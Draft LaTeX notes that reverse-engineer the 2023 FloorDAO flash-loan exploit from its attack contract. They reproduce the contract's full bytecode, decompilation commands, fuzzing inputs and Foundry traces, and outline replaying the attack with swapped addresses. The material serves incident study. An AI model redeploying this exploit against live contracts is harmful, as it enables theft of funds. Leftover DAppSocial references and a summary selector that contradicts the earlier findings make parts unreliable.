% @KeyInfo -- Total Lost : ~40 eth
% Attacker : https://etherscan.io/address/0x4453aed57c23a50d887a42ad0cd14ff1b819c750
% Attack Contract : https://etherscan.io/address/0x6ce5a85cff4c70591da82de5eb91c3fa38b40595
% Attacker Transaction : https://explorer.phalcon.xyz/tx/eth/0x1274b32d4dfacd2703ad032e8bd669a83f012dde9d27ed92e4e7da0387adafe4

% @Analysis
% https://twitter.com/PeckShieldAlert/status/1698962105058361392
% https://medium.com/floordao/floor-post-mortem-incident-summary-september-5-2023-e054a2d5afa4

\section{Timeline}

\subsection{Setup}

\href{\urltxdappsocialsetupcreation}{Contract creation}:

\begin{lstlisting}[language=Json]

\end{lstlisting}

\subsection{Funding}

\href{\urltxdappsocialsetupusdt}{USDT funding}:

\begin{lstlisting}[language=Json]

\end{lstlisting}

\href{\urltxdappsocialsetupusdc}{USDC funding}:

\begin{lstlisting}[language=Json]

\end{lstlisting}

\subsection{Exploit}

The exploit is \href{\urltxdappsocialexploit}{called with the address of DAppSocial}:

\begin{lstlisting}[language=Json]

\end{lstlisting}

inputs: DappSocial address is not in the runtime nor creation bytecode of any contract (attack / helper)

\section{Simulation}

\subsection{Known}

Contract creator:

Creation bytecode:

Runtime bytecode:

\subsection{Guessing}

\subsubsection{Fuzzing Patterns}

\begin{lstlisting}[language=Python]
['0x000000000000000000000000aaaaaaabaaacaaadaaaeaaafaab0aab1aab2aab3', '0x000000000000000000000000aab4aab5aab6aab7aab8aab9aabaaabbaabcaabd', '0x000000000000000000000000aabeaabfaac0aac1aac2aac3aac4aac5aac6aac7', '0x000000000000000000000000aac8aac9aacaaacbaaccaacdaaceaacfaad0aad1', '0x000000000000000000000000aad2aad3aad4aad5aad6aad7aad8aad9aadaaadb', '0x000000000000000000000000aadcaaddaadeaadfaae0aae1aae2aae3aae4aae5', '0x000000000000000000000000aae6aae7aae8aae9aaeaaaebaaecaaedaaeeaaef', '0x000000000000000000000000aaf0aaf1aaf2aaf3aaf4aaf5aaf6aaf7aaf8aaf9', '0x000000000000000000000000aafaaafbaafcaafdaafeaaffab00ab01ab02ab03', '0x000000000000000000000000ab04ab05ab06ab07ab08ab09ab0aab0bab0cab0d', '0x000000000000000000000000ab0eab0fab10ab11ab12ab13ab14ab15ab16ab17', '0x000000000000000000000000ab18ab19ab1aab1bab1cab1dab1eab1fab20ab21', '0x000000000000000000000000ab22ab23ab24ab25ab26ab27ab28ab29ab2aab2b', '0x000000000000000000000000ab2cab2dab2eab2fab30ab31ab32ab33ab34ab35', '0x000000000000000000000000ab36ab37ab38ab39ab3aab3bab3cab3dab3eab3f', '0x000000000000000000000000ab40ab41ab42ab43ab44ab45ab46ab47ab48ab49']
['0xab4aab4bab4cab4dab4eab4fab50ab51ab52ab53ab54ab55ab56ab57ab58ab59', '0xab5aab5bab5cab5dab5eab5fab60ab61ab62ab63ab64ab65ab66ab67ab68ab69', '0xab6aab6bab6cab6dab6eab6fab70ab71ab72ab73ab74ab75ab76ab77ab78ab79', '0xab7aab7bab7cab7dab7eab7fab80ab81ab82ab83ab84ab85ab86ab87ab88ab89', '0xab8aab8bab8cab8dab8eab8fab90ab91ab92ab93ab94ab95ab96ab97ab98ab99', '0xab9aab9bab9cab9dab9eab9faba0aba1aba2aba3aba4aba5aba6aba7aba8aba9', '0xabaaabababacabadabaeabafabb0abb1abb2abb3abb4abb5abb6abb7abb8abb9', '0xabbaabbbabbcabbdabbeabbfabc0abc1abc2abc3abc4abc5abc6abc7abc8abc9', '0xabcaabcbabccabcdabceabcfabd0abd1abd2abd3abd4abd5abd6abd7abd8abd9', '0xabdaabdbabdcabddabdeabdfabe0abe1abe2abe3abe4abe5abe6abe7abe8abe9', '0xabeaabebabecabedabeeabefabf0abf1abf2abf3abf4abf5abf6abf7abf8abf9', '0xabfaabfbabfcabfdabfeabffac00ac01ac02ac03ac04ac05ac06ac07ac08ac09', '0xac0aac0bac0cac0dac0eac0fac10ac11ac12ac13ac14ac15ac16ac17ac18ac19', '0xac1aac1bac1cac1dac1eac1fac20ac21ac22ac23ac24ac25ac26ac27ac28ac29', '0xac2aac2bac2cac2dac2eac2fac30ac31ac32ac33ac34ac35ac36ac37ac38ac39', '0xac3aac3bac3cac3dac3eac3fac40ac41ac42ac43ac44ac45ac46ac47ac48ac49']
\end{lstlisting}

\subsubsection{The Selector(s ?)}

Bruteforce the following process and apply to each selector:

\begin{lstlisting}[language=Shell]
heimdall decompile --include-sol -o floor-dao/contracts/main.heimdall.sol -- 0x608060405234801561001057600080fd5b50600436106100415760003560e01c8063828cc5ce14610046578063e9cbafb01461006b578063fa461e33146100e7575b600080fd5b6100696004803603604081101561005c57600080fd5b5080359060200135610163565b005b6100696004803603606081101561008157600080fd5b8135916020810135918101906060810160408201356401000000008111156100a857600080fd5b8201836020820111156100ba57600080fd5b803590602001918460018302840111640100000000831117156100dc57600080fd5b509092509050610541565b610069600480360360608110156100fd57600080fd5b81359160208101359181019060608101604082013564010000000081111561012457600080fd5b82018360208201111561013657600080fd5b8035906020019184600183028401116401000000008311171561015857600080fd5b50909250905061099f565b6000546001600160a01b031633146101aa576040805162461bcd60e51b815260206004820152600560248201526477726f6e6760d81b604482015290519081900360640190fd5b600581905573b386c1d831eed803f5e8f274a59c91c4c22eeac082156101d0578261024f565b600254604080516370a0823160e01b81526001600160a01b038481166004830152915160019392909216916370a0823191602480820192602092909190829003018186803b15801561022157600080fd5b505afa158015610235573d6000803e3d6000fd5b505050506040513d602081101561024b57600080fd5b5051035b60048190556040805160018082528183019092526001600160a01b0384169263490e6cbc92309260009291602082018180368337019050506040518563ffffffff1660e01b815260040180856001600160a01b03166001600160a01b0316815260200184815260200183815260200180602001828103825283818151815260200191508051906020019080838360005b838110156102f75781810151838201526020016102df565b50505050905090810190601f1680156103245780820380516001836020036101000a031916815260200191505b5095505050505050600060405180830381600087803b15801561034657600080fd5b505af115801561035a573d6000803e3d6000fd5b5050600254604080516370a0823160e01b8152306004820152905173d3b85111c974c350f95532e3f4210a41c4874bb69450600093506001600160a01b03909216916370a0823191602480820192602092909190829003018186803b1580156103c257600080fd5b505afa1580156103d6573d6000803e3d6000fd5b505050506040513d60208110156103ec57600080fd5b5051905073fffd8963efd1fc6a506488495d951d5263988d256001600160a01b03841663128acb088460008585826040519080825280601f01601f191660200182016040528015610444576020820181803683370190505b506040518663ffffffff1660e01b815260040180866001600160a01b03166001600160a01b0316815260200185151515158152602001848152602001836001600160a01b03166001600160a01b0316815260200180602001828103825283818151815260200191508051906020019080838360005b838110156104d15781810151838201526020016104b9565b50505050905090810190601f1680156104fe5780820380516001836020036101000a031916815260200191505b509650505050505050600060405180830381600087803b15801561052157600080fd5b505af1158015610535573d6000803e3d6000fd5b50505050505050505050565b6000546001600160a01b03163214610588576040805162461bcd60e51b815260206004820152600560248201526477726f6e6760d81b604482015290519081900360640190fd5b73164afe96912099543bc2c48bb9358a095db8e78460005b60055481101561091157600254604080516370a0823160e01b815230600482015290516000926001600160a01b0316916370a08231916024808301926020929190829003018186803b1580156105f557600080fd5b505afa158015610609573d6000803e3d6000fd5b505050506040513d602081101561061f57600080fd5b5051600254600154604080516370a0823160e01b81526001600160a01b039283166004820152905193945060009391909216916370a08231916024808301926020929190829003018186803b15801561067757600080fd5b505afa15801561068b573d6000803e3d6000fd5b505050506040513d60208110156106a157600080fd5b505160408051639358928b60e01b815290519192506001600160a01b03861691639358928b916004808201926020929091908290030181600087803b1580156106e957600080fd5b505af11580156106fd573d6000803e3d6000fd5b505050506040513d602081101561071357600080fd5b505182820111610724575050610911565b6002546001546040805163095ea7b360e01b81526001600160a01b039283166004820152602481018690529051919092169163095ea7b391604480830192600092919082900301818387803b15801561077c57600080fd5b505af1158015610790573d6000803e3d6000fd5b50506001805460408051631b0cd93b60e31b815230600482015260248101889052600060448201819052606482019490945290516001600160a01b03909216945063d866c9d89350608480820193929182900301818387803b1580156107f557600080fd5b505af1158015610809573d6000803e3d6000fd5b5050600354604080516370a0823160e01b81523060048201529051600094506001600160a01b0390921692506370a08231916024808301926020929190829003018186803b15801561085a57600080fd5b505afa15801561086e573d6000803e3d6000fd5b505050506040513d602081101561088457600080fd5b5051600180546040805163990966d560e01b815230600482015260248101859052604481019390935260006064840181905290519394506001600160a01b039091169263990966d592608480820193929182900301818387803b1580156108ea57600080fd5b505af11580156108fe573d6000803e3d6000fd5b5050600190950194506105a09350505050565b50600254600480546040805163a9059cbb60e01b815233938101939093529087016024830152516001600160a01b039092169163a9059cbb916044808201926020929091908290030181600087803b15801561096c57600080fd5b505af1158015610980573d6000803e3d6000fd5b505050506040513d602081101561099657600080fd5b50505050505050565b6000546001600160a01b031632146109e6576040805162461bcd60e51b815260206004820152600560248201526477726f6e6760d81b604482015290519081900360640190fd5b60008084136109f857836000036109fa565b835b6002546040805163a9059cbb60e01b81523360048201526024810184905290519293506001600160a01b039091169163a9059cbb916044808201926020929091908290030181600087803b15801561096c57600080fdfea2646970667358221220cfea6782b04bf90721fa299d2de5584438d68fd41f5e9b93d214d7629002899364736f6c63430006060033
\end{lstlisting}

\begin{lstlisting}[language=Python]
ipb.get_function_selectors(__b, raw=True)
('fa461e33', 'e9cbafb0', '828cc5ce')
\end{lstlisting}

\subsubsection{The Inputs => The Signature}

Calls with 0 and 1 argument both fail with:

\begin{lstlisting}
├─ [143] 0x6cE5a85CFF4c70591DA82De5eb91c3Fa38B40595::flash()
│   └─ ← EvmError: Revert
\end{lstlisting}

Whether or not the arguments are addresses.

And with 2 or more arguments:

\begin{lstlisting}
[79509] FloorTest::testSignature2()
  ├─ [0] VM::startPrank(0x4453AeD57C23a50d887a42ad0CD14ff1b819C750, 0x4453AeD57C23a50d887a42ad0CD14ff1b819C750)
  │   └─ ← ()
  ├─ [72805] 0x6cE5a85CFF4c70591DA82De5eb91c3Fa38B40595::flash(77533965997997761695484487081744934313309858915403409051060529136478608468857 [7.753e76], 77562235982399944637832501665709823403500632086299117436268911242896959122313 [7.756e76])
  │   ├─ [22806] 0xB386c1d831eED803F5e8F274A59C91c4C22EEAc0::flash(0x6cE5a85CFF4c70591DA82De5eb91c3Fa38B40595, 0, 77533965997997761695484487081744934313309858915403409051060529136478608468857 [7.753e76], 0x00)
  │   │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xB386c1d831eED803F5e8F274A59C91c4C22EEAc0) [staticcall]
  │   │   │   └─ ← 0x00000000000000000000000000000000000000000000001d041af090a1efb349
  │   │   ├─ [2468] 0xf59257E961883636290411c11ec5Ae622d19455e::balanceOf(0xB386c1d831eED803F5e8F274A59C91c4C22EEAc0) [staticcall]
  │   │   │   └─ ← 0x00000000000000000000000000000000000000000000000000008a532b48a003
  │   │   ├─ [1191] 0xf59257E961883636290411c11ec5Ae622d19455e::transfer(0x6cE5a85CFF4c70591DA82De5eb91c3Fa38B40595, 77533965997997761695484487081744934313309858915403409051060529136478608468857 [7.753e76])
  │   │   │   └─ ← revert: ERC20: transfer amount exceeds balance
  │   │   └─ ← revert: TF
  │   └─ ← revert: TF
  ├─ [0] VM::stopPrank()
  │   └─ ← ()
  └─ ← ()
\end{lstlisting}

\subsubsection{The Funding}

At this point, we know the selector \lstinline{828cc5ce} and the parameters are 2 non-addresses, most likely amounts.

We can parse the tokens from the traces:

\begin{lstlisting}[language=Shell]
perl -ne 'm#(0x[0-9a-f]+)::transfer#i && print "$1\n"' samples/floor-dao/tests/guess.signature.0.log | sort -u
# 0xf59257E961883636290411c11ec5Ae622d19455e
perl -ne 'm#(0x[0-9a-f]+)::balance#i && print "$1\n"' samples/floor-dao/tests/guess.signature.0.log | sort -u
# 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
# 0xf59257E961883636290411c11ec5Ae622d19455e
\end{lstlisting}

We see the addresses of the helper contract, USDT and USDC.

Then the process is to:

\begin{itemize}
\item{fetch all the amounts}
\item{fetch the token addresses}
\item{transfer more than the max amount to attacker and helper contracts}
\end{itemize}

- diff test / fail
- fund all addresses related to the attacker
- approve all the addresses in the protocol
- find addresses related to the attacker in the traces

\begin{lstlisting}[language=Shell]
grep -ai 4453AeD57C23a50d887a42ad0CD14ff1b819C750 samples/floor-dao/tests/guess.signature.0.log
grep -ai 6cE5a85CFF4c70591DA82De5eb91c3Fa38B40595 samples/floor-dao/tests/guess.signature.0.log
\end{lstlisting}

From the trace length:
- high amounts => revert immediately
- lower amounts => further
- with deal / approve => further

\subsubsection{The Exploit}

Now the execution doesn't revert anymore with \lstinline{0x6cE5a85CFF4c70591DA82De5eb91c3Fa38B40595::flash(0, 1)}.

We can scrape extra information:

\begin{lstlisting}[language=Shell]
perl -ne 'm#(0x[0-9a-f]+)::transfer#i && print "$1\n"' samples/floor-dao/tests/guess.funding.4.log | sort -u
# 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
# 0xf59257E961883636290411c11ec5Ae622d19455e
perl -ne 'm#(0x[0-9a-f]+)::balance#i && print "$1\n"' samples/floor-dao/tests/guess.funding.4.log | sort -u
# 0x164AFe96912099543BC2c48bb9358a095Db8e784
# 0xb1Cc59Fc717b8D4783D41F952725177298B5619d
# 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
# 0xf59257E961883636290411c11ec5Ae622d19455e
perl -ne 'm#(0x[0-9a-f]+)::approve#i && print "$1\n"' samples/floor-dao/tests/guess.funding.4.log | sort -u
# 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
# 0xf59257E961883636290411c11ec5Ae622d19455e
\end{lstlisting}

The final step is to detect whether execution resulted in an extraordinary increase in balance.

\begin{lstlisting}[language=Shell]
perl -ne 'm#aAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3::(\w+)\(#i && print "$1\n"' samples/floor-dao/tests/guess.signature.2.log | sort -u
\end{lstlisting}

\section{On transaction}

execute directly

setup ourselves = redeploy their helper

mutate = replace addresses with own contracts

\section{Summary}

\subsection{Selectors And Signatures}

\begin{lstlisting}[language=Solidity]
exploit(address)
\end{lstlisting}

\subsection{Inputs}

- amounts
- addresses

\subsection{Sources}

\subsection{IOCs}

- selectors / signatures: 0x0aeb4ddf / exploit(address token)
- creates contract

\subsection{Process}

- bruteforce funding? all tokens?
